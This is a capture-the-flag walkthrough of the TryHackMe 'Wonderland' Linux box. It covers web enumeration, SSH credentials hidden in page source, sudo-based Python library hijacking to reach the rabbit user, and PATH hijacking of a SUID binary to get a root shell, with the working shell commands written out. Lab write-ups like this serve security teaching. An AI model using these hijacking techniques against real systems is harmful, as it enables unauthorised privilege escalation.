# Wonderland

**Platform:** TryHackMe
**OS:** Linux
**Tags:** Web Enum, Hidden Credentials, SUID, PATH Hijacking, Python Library Hijack
**Date:** 2026-05-04

SSH credentials hidden in page source give initial access. Python library hijacking moves between users and PATH hijacking via a SUID binary gives root.

## 1. Enumeration

```bash
nmap -sV -sC -T4 <TARGET_IP>
```

Findings:
- 22/tcp - OpenSSH 7.6p1 Ubuntu
- 80/tcp - Golang net/http server, page title: "Follow the white rabbit."

## 2. Web Enumeration

The site hints to follow the white rabbit. Manually navigated the directory structure - the path was literally spelled out:

```
http://<TARGET_IP>/r/
http://<TARGET_IP>/r/a/
http://<TARGET_IP>/r/a/b/
http://<TARGET_IP>/r/a/b/b/
http://<TARGET_IP>/r/a/b/b/i/
http://<TARGET_IP>/r/a/b/b/i/t/
```

Viewed the page source at `/r/a/b/b/i/t/`. Found SSH credentials hidden in a hidden HTML element:

```html
<p style="display: none;">alice:<password></p>
```

Tip: Always view page source on themed CTF boxes - developers love hiding hints in HTML comments and hidden elements.

## 3. Initial Access: Alice

```bash
ssh alice@<TARGET_IP>
```

Landed in Alice's home directory. Found `walrus_and_the_carpenter.py` and `root.txt`. Root flag is in Alice's directory but unreadable. User flag is in `/root/`. Classic Wonderland twist.

**Initial access as alice established.**

## 4. Lateral Movement: rabbit User

Checked sudo permissions for alice:

```bash
sudo -l
```

Alice can run `walrus_and_the_carpenter.py` as rabbit with sudo. The script imports the `random` library. Created a fake `random.py` in the current directory to hijack the import.

```bash
# Create fake random.py in /home/alice/
echo 'import os; os.system("/bin/bash")' > random.py
sudo -u rabbit /usr/bin/python3 /home/alice/walrus_and_the_carpenter.py
```

**Shell as rabbit obtained.**

Found a SUID binary in rabbit's home: `teaParty`

```bash
ls -la /home/rabbit/teaParty
strings /home/rabbit/teaParty
```

Strings output revealed it calls `date` without a full path - vulnerable to PATH hijacking.

## 5. PrivEsc: PATH Hijacking

The `teaParty` binary is SUID root and calls `date` without an absolute path. Created a fake `date` binary and prepended the directory to PATH.

```bash
# Create malicious date binary
cd /tmp
echo '/bin/bash' > date
chmod +x date

# Prepend /tmp to PATH
export PATH=/tmp:$PATH

# Run the SUID binary
/home/rabbit/teaParty
```

**Root shell obtained. Retrieved flags from /root/ and /home/alice/**

Key Takeaway: When a SUID binary calls a command without its full path, you can hijack it by creating a fake binary with the same name and putting its directory first in PATH. Always run `strings` on unknown binaries.
